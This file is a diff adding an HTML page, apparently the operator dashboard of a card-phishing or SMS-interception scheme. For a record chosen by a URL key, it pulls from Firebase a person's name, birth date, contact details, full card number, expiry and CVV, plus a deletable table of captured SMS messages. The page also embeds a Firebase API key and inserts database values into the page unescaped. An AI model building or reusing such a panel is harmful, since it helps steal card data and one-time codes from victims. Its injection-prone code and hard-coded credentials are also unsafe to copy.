@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>View Data</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+    <!-- Include Firebase libraries -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.8/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.8/firebase-database-compat.js"></script>
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background: linear-gradient(135deg, #f4f4f9 0%, #e0e0e0 100%);
+            color: #333;
+        }
+    
+        .container {
+            padding: 20px;
+            margin: auto;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            max-width: 1200px;
+        }
+    
+        h1 {
+            font-size: 2em;
+            color: #444;
+            border-bottom: 2px solid #007bff;
+            padding-bottom: 12px;
+            margin-bottom: 24px;
+        }
+    
+        .data-container, .sms-container {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+    
+        .sms-container {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+    
+        .entry {
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            border: 1px solid #ddd;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+    
+        .entry p {
+            margin: 8px 0;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            gap: 16px;
+        }
+    
+        .entry p span.label {
+            font-weight: 600;
+            width: 40%;
+            color: #555;
+        }
+    
+        .entry p span.data {
+            font-weight: normal;
+            color: #000;
+            width: 60%;
+        }
+    
+        .entry button {
+            margin-top: 12px;
+            padding: 12px 16px;
+            font-size: 1em;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            width: 100%;
+        }
+    
+        .entry button:hover {
+            background-color: #0056b3;
+            transform: translateY(-2px);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 16px;
+        }
+    
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+    
+        th, td {
+            padding: 12px;
+            text-align: left;
+        }
+    
+        th {
+            background-color: #007bff;
+            color: white;
+        }
+
+        tbody tr:nth-child(even) {
+            background-color: #f2f2f2;
+        }
+
+        tbody tr:hover {
+            background-color: #e9ecef;
+        }
+    
+        button.delete-button {
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+    
+        button.delete-button:hover {
+            background-color: #c82333;
+            transform: translateY(-2px);
+        }
+    
+        /* Responsive Table */
+        .table-responsive {
+            overflow-x: auto;
+        }
+        button.btn {
+            background-color: transparent;
+            color: #dc3545;
+            border: none;
+            cursor: pointer;
+            font-size: 1.2em;
+            transition: color 0.3s ease, transform 0.2s ease;
+        }
+
+        button.btn:hover {
+            color: #c82333;
+            transform: translateY(-2px);
+        }
+
+        button.btn i {
+            pointer-events: none;
+        }
+    
+        /* Mobile-specific styles */
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.5em;
+            }
+
+            .container {
+                padding: 10px;
+            }
+
+            .entry p span.label, .entry p span.data {
+                width: 100%;
+            }
+
+            th, td {
+                padding: 8px;
+            }
+
+            table, th, td {
+                font-size: 0.875em;
+            }
+
+            .entry button {
+                padding: 10px 14px;
+                font-size: 0.9em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 id="keyvalue">View Data</h1>
+        <div id="details-container" class="details-container"></div>
+        <div id="data-container" class="data-container"></div>
+        <div id="sms-container" class="sms-container">
+            <!-- SMS data will be loaded here as a table -->
+            <div class="table-responsive">
+                <table id="sms-table">
+                    <thead>
+                        <tr>
+                            <th>Number</th>
+                            <th>Message</th>
+                            <th>Time</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <!-- SMS entries will be dynamically inserted here -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAEEaLD5oa8eDItR4P1E8kuS8iEeLCLoLA",
+            authDomain: "fir-8966a.firebaseapp.com",
+            databaseURL: "https://fir-8966a-default-rtdb.firebaseio.com",
+            projectId: "fir-8966a",
+            storageBucket: "fir-8966a.appspot.com",
+            messagingSenderId: "495754940168",
+            appId: "1:495754940168:web:c739abef5c4cca1b5726bd",
+            measurementId: "G-YVQ1XG13S0"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const key = urlParams.get("key");
+            
+        if (key) {
+            document.getElementById('keyvalue').textContent = `${key}`;
+
+            const database = firebase.database();
+            const db = database.ref("/data");
+            const dbRef = db.child(`/${key}/Details`);
+            const smsRef = db.child(`/${key}/SMS`);
+
+            // Fetch details data
+            dbRef.once('value')
+                .then(snapshot => {
+                    const detailsData = snapshot.val();
+                    const detailsContainer = document.getElementById('details-container');
+                    detailsContainer.innerHTML = ''; // Clear the container first
+
+                    if (detailsData) {
+                        const detailsEntries = `
+                            <div class="entry">
+                                <p><span class="label">Name:</span> ${detailsData.name || 'N/A'}</p>
+                                <p><span class="label">Date Of Birth:</span> ${detailsData.dob || 'N/A'}</p>
+                                <p><span class="label">Email:</span> ${detailsData.email || 'N/A'}</p>
+                                <p><span class="label">Mobile Number:</span> ${detailsData.mobile || 'N/A'}</p>
+                                <p><span class="label">City:</span> ${detailsData.city || 'N/A'}</p>
+                                <p><span class="label">Card Holder Name:</span> ${detailsData.CardHolderName || 'N/A'}</p>
+                                <p><span class="label">Card Number:</span> ${detailsData.cardNumber || 'N/A'}</p>
+                                <p><span class="label">Expiry Date:</span> ${detailsData.expiryDate || 'N/A'}</p>
+                                <p><span class="label">Cvv:</span> ${detailsData.cvv || 'N/A'}</p>
+                            </div>
+                        `;
+                        detailsContainer.innerHTML = detailsEntries;
+                    } else {
+                        detailsContainer.innerHTML = '<p>No details data available</p>';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching details data:', error);
+                    document.getElementById('details-container').innerHTML = '<p>Error fetching details data</p>';
+                });
+
+            // Fetch SMS data and display in table format
+            smsRef.once('value')
+                .then(snapshot => {
+                    const smsData = snapshot.val();
+                    const smsTableBody = document.getElementById('sms-table').querySelector('tbody');
+                    smsTableBody.innerHTML = ''; // Clear the table body first
+
+                    if (smsData && typeof smsData === 'object') {
+                        // Convert smsData object to array and sort by time
+                        const sortedSmsData = Object.keys(smsData)
+                            .map(key => ({ key, ...smsData[key] }))
+                            .sort((a, b) => new Date(b.time) - new Date(a.time));
+
+                        const smsEntries = sortedSmsData.map(({ key, number, msg, time }) => `
+                            <tr data-key="${key}">
+                                <td>${number || 'N/A'}</td>
+                                <td>${msg || 'N/A'}</td>
+                                <td>${time || 'N/A'}</td>
+                                <td><button class="btn" onclick="deleteSms('${key}')"><i class="fa fa-trash"></i></button></td>
+                            </tr>
+                        `).join('');
+                        smsTableBody.innerHTML = smsEntries;
+                    } else {
+                        smsTableBody.innerHTML = '<tr><td colspan="4">No SMS data available</td></tr>';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching SMS data:', error);
+                    document.getElementById('sms-table').querySelector('tbody').innerHTML = '<tr><td colspan="4">Error fetching SMS data</td></tr>';
+                });
+        } else {
+            document.getElementById('details-container').innerHTML = '<p>No key provided</p>';
+            document.getElementById('data-container').innerHTML = '<p>No key provided</p>';
+            document.getElementById('sms-table').querySelector('tbody').innerHTML = '<tr><td colspan="4">No key provided</td></tr>';
+        }
+
+        // Function to delete SMS entry
+        function deleteSms(smsKey) {
+            if (confirm('Are you sure you want to delete this SMS entry?')) {
+                const db = firebase.database();
+                const smsRef = db.ref(`data/${key}/SMS/${smsKey}`);
+                smsRef.remove()
+                    .then(() => {
+                        // Remove the entry from the DOM
+                        document.querySelector(`tr[data-key="${smsKey}"]`).remove();
+                    })
+                    .catch(error => {
+                        console.error('Error deleting SMS entry:', error);
+                        alert('Failed to delete the SMS entry. Please try again.');
+                    });
+            }
+        }
+    </script>
+</body>
+</html>
